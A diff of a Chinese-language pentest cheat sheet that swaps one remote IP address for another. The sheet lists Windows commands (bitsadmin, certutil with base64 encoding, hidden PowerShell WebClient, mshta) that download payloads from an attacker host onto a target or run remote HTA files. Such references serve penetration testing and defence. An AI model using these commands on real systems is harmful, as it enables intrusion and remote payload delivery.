@@ -12,35 +12,35 @@ topics = ["Pentest"]
 
 ### 0x00 bitsadmin下载文件
 ```bash
-bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
-bitsadmin /rawreturn /transfer getpayload http://114.115.214.203/a.zip C:\Windows\Temp\a.zip
-bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
+bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe
+bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip
+bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe
 ```
 
 ### 0x01 certutil下载文件
 保存在当前目录
 ```bash
-certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
+certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe
 ```
 
 有时会下载二进制文件的base64编码后的字符串，然后再解码
 ```
 本地：certutil -encode cc.exe base64.txt
-目标：certutil -urlcache -split -f http://114.115.214.203/base64.txt
+目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt
 目标：certutil -decode base64.txt cc.exe
 ```
 
 文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 ```bash
-certutil -urlcache -f http://114.115.214.203/a.exe
+certutil -urlcache -f http://114.115.123.123/a.exe
 ```
 
 ### 0x02 powershell下载文件
 ```bash
-powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")
+powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.123.123/a.exe","C:\Windows\Temp\a.exe")
 
 #-w hidden 下载后终端自动退出
-powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")
+powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://114.115.123.123/a.exe","C:\Windows\Temp\a.exe")
 ```
 
 ### 0x03 mshta下载文件与执行远程文件
@@ -49,8 +49,8 @@ powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://1
 * 执行远程hta文件
 
 ```bash
-mshta http://114.115.214.203/payload.hta
-mshta http://114.115.214.203/a.exe
+mshta http://114.115.123.123/payload.hta
+mshta http://114.115.123.123/a.exe
 #payload.hta和a.exe都会被缓存在IE的缓存目录
 ```
 payload.hta
